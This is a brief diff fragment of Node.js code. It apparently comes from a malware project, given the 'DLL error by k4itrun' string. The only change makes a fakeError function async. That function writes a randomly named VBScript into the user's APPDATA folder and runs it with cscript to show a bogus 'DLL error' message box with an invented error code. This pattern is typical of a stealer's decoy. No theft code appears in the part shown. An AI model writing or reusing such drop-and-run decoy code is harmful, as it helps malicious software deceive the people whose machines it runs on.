@@ -15,7 +15,7 @@ const id = (h) => {
     }
 };
 
-const fakeError = (m) => {
+const fakeError = async (m) => {
     let random = id(10), vbs = process.env.APPDATA + "\\" + random + ".vbs";
     fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${m === "" ? "DLL error by k4itrun":m}", vbInformation, "Error Code: 43"`, "utf8");
     exec("cscript " + vbs, (err, stdout, stderr) => {
